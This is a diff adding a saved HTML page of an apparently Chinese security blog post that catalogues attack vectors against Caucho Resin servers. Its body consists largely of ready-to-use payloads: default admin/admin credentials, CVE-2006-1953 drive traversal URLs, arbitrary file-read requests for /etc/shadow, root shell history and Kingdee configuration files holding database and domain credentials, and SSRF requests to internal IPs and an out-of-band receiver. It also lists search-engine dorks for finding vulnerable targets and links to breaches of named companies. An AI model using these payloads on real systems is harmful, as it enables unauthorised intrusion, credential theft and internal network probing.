@@ -1,0 +1,698 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,Red Team," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 针对Resin服务的攻击向量整理 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              针对Resin服务的攻击向量整理
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-10-30
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/10/30/resin-attack-vectors/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/30/resin-attack-vectors/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="0x00-弱口令"><a href="#0x00-弱口令" class="headerlink" title="0x00 弱口令"></a>0x00 弱口令</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/resin-admin/</span></div><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/resin-admin/</span>status.php</div><div class="line">admin<span class="regexp">/admin</span></div></pre></td></tr></table></figure>
+<h1 id="0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><a href="#0x01-CVE-2006-1953-Resin-Windows远程目录遍历漏洞" class="headerlink" title="0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞"></a>0x01 CVE-2006-1953 Resin Windows远程目录遍历漏洞</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.rapid7.com/resources/advisories/R7-0024.jsp" target="_blank" rel="external">https://www.rapid7.com/resources/advisories/R7-0024.jsp</a><br><a href="http://www.nsfocus.net/vulndb/8829" target="_blank" rel="external">http://www.nsfocus.net/vulndb/8829</a></p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>受影响系统：<br>Caucho Technology Resin v3.0.18 for Windows<br>Caucho Technology Resin v3.0.17 for Windows</p>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/C:%5C/</span></div><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/D:%5C/</span></div><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/E:%5C/</span></div><div class="line">http:<span class="regexp">//</span>victim.com<span class="regexp">/F:%5C/</span></div></pre></td></tr></table></figure>
+<h1 id="0x02-Resin-20任意文件读取"><a href="#0x02-Resin-20任意文件读取" class="headerlink" title="0x02 Resin %20任意文件读取"></a>0x02 Resin %20任意文件读取</h1><p><a href="http://webscan.360.cn/vul/view/vulid/3528" target="_blank" rel="external">http://webscan.360.cn/vul/view/vulid/3528</a></p>
+<h1 id="Resin-Windows-漏洞"><a href="#Resin-Windows-漏洞" class="headerlink" title="Resin Windows 漏洞"></a>Resin Windows 漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Resin for Windows实现上存在多个漏洞，远程攻击者可能利用此漏洞非授权获取敏感信息。<br>Resin 没有正确过滤通过URL传送的输入，允许远程攻击者通过在URL中提供有任意扩展名的 DOS 设备文件名从系统上的任意 COM 或 LPT设备读取连续的数据流、通过目录遍历攻击泄露Web应用的WEB-INF目录中的文件内容，或通过包含有特殊字符的URL泄露到Caucho Resin服务器的完整系统路径。</p>
+<h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">Professional</span> <span class="selector-tag">v3</span><span class="selector-class">.1</span><span class="selector-class">.0</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.1</span><span class="selector-class">.0</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.0</span><span class="selector-class">.21</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.0</span><span class="selector-class">.20</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.0</span><span class="selector-class">.19</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.0</span><span class="selector-class">.18</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.0</span><span class="selector-class">.17</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">KNOWN</span> <span class="selector-tag">FIXED</span>:</div><div class="line"></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">v3</span><span class="selector-class">.1</span><span class="selector-class">.1</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div><div class="line"><span class="selector-tag">Caucho</span> <span class="selector-tag">Resin</span> <span class="selector-tag">Professional</span> <span class="selector-tag">v3</span><span class="selector-class">.1</span><span class="selector-class">.1</span> <span class="selector-tag">for</span> <span class="selector-tag">Windows</span></div></pre></td></tr></table></figure>
+<h2 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="link">http://www.example.com:8080/</span>[<span class="string">path</span>]/[device].[extension]</div><div class="line">http://www.example.com:8080/%20../web-inf</div><div class="line">http://www.example.com:8080/%20</div><div class="line"><span class="link">http://www.example.com:8080/</span>[<span class="string">path</span>]/%20.xtp</div></pre></td></tr></table></figure>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>通过此漏洞可以读取到串口设备的信息以及网站任意目录的文件遍历。</p>
+<h1 id="0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF"><a href="#0x03-Resin-jndi-appconfig-inputFile-任意文件读取-SSRF" class="headerlink" title="0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF"></a>0x03 Resin jndi-appconfig inputFile 任意文件读取/SSRF</h1><p>略，之后补充payloads</p>
+<h1 id="0x04-Resin-viewfile-任意文件读取"><a href="#0x04-Resin-viewfile-任意文件读取" class="headerlink" title="0x04 Resin viewfile 任意文件读取"></a>0x04 Resin viewfile 任意文件读取</h1><p>略，之后补充payloads</p>
+<h1 id="0x10-Payloads"><a href="#0x10-Payloads" class="headerlink" title="0x10 Payloads"></a>0x10 Payloads</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/resin/</span>conf/resin.conf</div><div class="line"></div><div class="line"><span class="meta"># 基类Payload</span></div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?file=/WEB-INF/web.xml</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>hosts</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=远端服务器(Ceye)/内网IP</div><div class="line">/%<span class="number">20.</span>./WEB-INF/</div><div class="line"></div><div class="line"><span class="meta"># 弱口令</span></div><div class="line"><span class="meta-keyword">/resin-admin/</span>status.php</div><div class="line"></div><div class="line"><span class="meta"># 衍生Payload</span></div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>hosts</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>passwd</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>shadow</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/opt/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>sysconfig<span class="meta-keyword">/network-scripts/</span>ifcfg-eth1</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=~/.bashrc_history</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/root/</span>.bashrc_history</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/opt/</span>www<span class="meta-keyword">/nagios/</span>WEB-INF/nagios.conf</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/opt/</span>nagios<span class="meta-keyword">/etc/</span>hostgroup.cfg</div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=<span class="meta-keyword">/etc/</span>passwd</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?file=/WEB-INF/web.xml</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=/<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=fakefile.xml</div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=/<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=<span class="meta-keyword">/etc/</span>hosts</div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=/<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=<span class="meta-keyword">/etc/</span>shadow</div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=/otherwebapp<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=WEB-INF/web.xml</div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=./<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=WEB-INF/web.xml</div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?contextpath=C:\<span class="variable">&amp;servletpath</span>=<span class="variable">&amp;file</span>=boot.ini</div><div class="line"></div><div class="line"><span class="meta-keyword">/resin-doc/</span>viewfile/?file=index.jsp</div><div class="line"></div><div class="line"><span class="meta-keyword">/resin-doc/</span>examples<span class="meta-keyword">/ioc-periodictask/</span>viewfile?file=index.xtp</div><div class="line"><span class="meta-keyword">/resin-doc/</span>examples<span class="meta-keyword">/jndi-appconfig/</span>test?inputFile=C:\Windows\system.ini</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta"># 针对金蝶的payload</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/editor/</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/disk/</span></div><div class="line"><span class="meta"># AD域服务器帐号密码(可能未配置)</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span>classes/ad_config.conf  </div><div class="line"><span class="meta"># ctop数据库帐号密码</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span>classes/ctop.conf</div><div class="line"><span class="meta"># 短信网关</span></div><div class="line"><span class="meta-keyword">/kingdee/</span>%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span>classes/sms_config.conf</div><div class="line"><span class="meta"># 金蝶变形</span></div><div class="line"><span class="meta-keyword">/ctop/</span>%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta"># 潜在的绕过</span></div><div class="line">/%<span class="number">20.</span>.<span class="meta-keyword">/web-inf/</span></div><div class="line">/%<span class="number">20.</span>./WEB-INF/</div><div class="line"></div><div class="line"><span class="meta"># 潜在的SSRF</span></div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=http:<span class="comment">//10.0.201.75</span></div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=https:<span class="comment">//www.secpulse.com/robots.txt</span></div><div class="line"><span class="meta-keyword">/resin-doc/</span>resource<span class="meta-keyword">/tutorial/</span>jndi-appconfig/test?inputFile=远端服务器(Ceye)</div><div class="line"></div><div class="line"><span class="meta"># CVE-2006-1953</span></div><div class="line">/A:%<span class="number">5</span>C/</div><div class="line">/B:%<span class="number">5</span>C/</div><div class="line">/C:%<span class="number">5</span>C/</div><div class="line">/D:%<span class="number">5</span>C/</div><div class="line">/E:%<span class="number">5</span>C/</div><div class="line">/F:%<span class="number">5</span>C/</div><div class="line">/G:%<span class="number">5</span>C/</div><div class="line">/H:%<span class="number">5</span>C/</div></pre></td></tr></table></figure>
+<h1 id="0x11案例"><a href="#0x11案例" class="headerlink" title="0x11案例"></a>0x11案例</h1><p>主要流行时间<br>15年6月-15年12月</p>
+<p><a href="https://web.archive.org/web/20130915134701/https://www.rapid7.com/resources/advisories/R7-0028.jsp" target="_blank" rel="external">https://web.archive.org/web/20130915134701/https://www.rapid7.com/resources/advisories/R7-0028.jsp</a><br><a href="https://www.rapid7.com/resources/advisories/R7-0028.jsp" target="_blank" rel="external">https://www.rapid7.com/resources/advisories/R7-0028.jsp</a><br><a href="https://www.rapid7.com/resources/advisories/R7-0029.jsp" target="_blank" rel="external">https://www.rapid7.com/resources/advisories/R7-0029.jsp</a><br><a href="https://www.rapid7.com/resources/advisories/R7-0030.jsp" target="_blank" rel="external">https://www.rapid7.com/resources/advisories/R7-0030.jsp</a></p>
+<h2 id="a-20-任意文件读取"><a href="#a-20-任意文件读取" class="headerlink" title="a. %20 任意文件读取"></a>a. %20 任意文件读取</h2><p>Resin漏洞利用案例之目录遍历/以金蝶某系统为例<br><a href="https://www.secpulse.com/archives/39144.html" target="_blank" rel="external">https://www.secpulse.com/archives/39144.html</a></p>
+<p>中国人寿某站存在resin目录遍历漏洞导致内部多数据库信息泄露<br><a href="https://www.secpulse.com/archives/41485.html" target="_blank" rel="external">https://www.secpulse.com/archives/41485.html</a></p>
+<h2 id="b-jndi-appconfig-inputFile-任意文件读取-SSRF"><a href="#b-jndi-appconfig-inputFile-任意文件读取-SSRF" class="headerlink" title="b. jndi-appconfig inputFile 任意文件读取/SSRF"></a>b. jndi-appconfig inputFile 任意文件读取/SSRF</h2><p>和讯网某分站resin任意文件读取附赠xss一枚<br><a href="https://www.secpulse.com/archives/37175.html" target="_blank" rel="external">https://www.secpulse.com/archives/37175.html</a></p>
+<p>和讯网某站点任意文件读取和SSRF漏洞<br><a href="https://www.secpulse.com/archives/34659.html" target="_blank" rel="external">https://www.secpulse.com/archives/34659.html</a></p>
+<p>21CN某站点站点任意文件读取和SSRF漏洞可探测内网（resin成功利用案例）<br><a href="https://www.secpulse.com/archives/40166.html" target="_blank" rel="external">https://www.secpulse.com/archives/40166.html</a></p>
+<h2 id="c-viewfile-任意文件读取"><a href="#c-viewfile-任意文件读取" class="headerlink" title="c. viewfile 任意文件读取"></a>c. viewfile 任意文件读取</h2><p>58同城漏洞大集合(任意上传，Resin远程文件等)<br><a href="https://www.secpulse.com/archives/15056.html" target="_blank" rel="external">https://www.secpulse.com/archives/15056.html</a></p>
+<p>百合网从Resin文件读取到webshell<br><a href="https://www.secpulse.com/archives/14755.html" target="_blank" rel="external">https://www.secpulse.com/archives/14755.html</a></p>
+<p>爱奇艺Resin配置漏洞<br><a href="https://www.secpulse.com/archives/13485.html" target="_blank" rel="external">https://www.secpulse.com/archives/13485.html</a></p>
+<p>搜狐网Resin配置漏洞，导致敏感信息泄露<br><a href="https://www.secpulse.com/archives/12074.html" target="_blank" rel="external">https://www.secpulse.com/archives/12074.html</a></p>
+<p>南方电网国际resin任意文件读取<br><a href="https://www.secpulse.com/archives/9536.html" target="_blank" rel="external">https://www.secpulse.com/archives/9536.html</a></p>
+<h2 id="d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞"><a href="#d-CVE-2006-1953-Resin-Windows远程目录遍历漏洞" class="headerlink" title="d. CVE-2006-1953 Resin Windows远程目录遍历漏洞"></a>d. CVE-2006-1953 Resin Windows远程目录遍历漏洞</h2><p>Resin漏洞利用案例之Windows全盘遍历漏洞（以某省戒毒所为例）<br><a href="https://www.secpulse.com/archives/37313.html" target="_blank" rel="external">https://www.secpulse.com/archives/37313.html</a></p>
+<p>万户OA<br>万户网络Resin版本过低导致客户网站磁盘信息泄露<br><a href="https://www.secpulse.com/archives/30621.html" target="_blank" rel="external">https://www.secpulse.com/archives/30621.html</a></p>
+<p>万户网络技建站使用中间件Resin版本过低导致众多客户网站磁盘信息泄露<br><a href="https://www.secpulse.com/archives/20697.html" target="_blank" rel="external">https://www.secpulse.com/archives/20697.html</a></p>
+<h2 id="e-弱口令"><a href="#e-弱口令" class="headerlink" title="e. 弱口令"></a>e. 弱口令</h2><p>人人网多个Resin弱口令<br><a href="https://www.secpulse.com/archives/29247.html" target="_blank" rel="external">https://www.secpulse.com/archives/29247.html</a></p>
+<p>17173两个站点Resin存在弱口令<br><a href="https://www.secpulse.com/archives/24364.html" target="_blank" rel="external">https://www.secpulse.com/archives/24364.html</a></p>
+<h1 id="0x12-自动化目标方案"><a href="#0x12-自动化目标方案" class="headerlink" title="0x12 自动化目标方案"></a>0x12 自动化目标方案</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>jndi-appconfig/test</div><div class="line">Shadon</div><div class="line">FOFA/Zoomeye</div></pre></td></tr></table></figure>
+<h1 id="0x13-补充"><a href="#0x13-补充" class="headerlink" title="0x13 补充"></a>0x13 补充</h1><p>Ceye<br>HTTP盲攻击接收/可视化<br>可以参考 Cplushua(宫华) 的 HTTP 盲攻击 (Freebuf公开课)<br>这里的盲攻击指的是无回显的攻击。</p>
+<p><a href="http://ceye.io/record/index" target="_blank" rel="external">http://ceye.io/record/index</a><br><a href="https://sso.telnet404.com/cas/login?service=http%3A%2F%2Fceye.io%2Flogin%2F" target="_blank" rel="external">https://sso.telnet404.com/cas/login?service=http%3A%2F%2Fceye.io%2Flogin%2F</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/Red-Team/"> #Red Team </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/30/rat-history/">1989 至 2017 长达29年的 RAT 编年史</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/30/ssl-ccs-injection/">CVE-2014-0224 SSL/TLS中间人攻击漏洞(CCS注入)</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/10/30/resin-attack-vectors/"
+               data-title="针对Resin服务的攻击向量整理" data-url="http://blkstone.github.io/2017/10/30/resin-attack-vectors/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">465</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">139</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
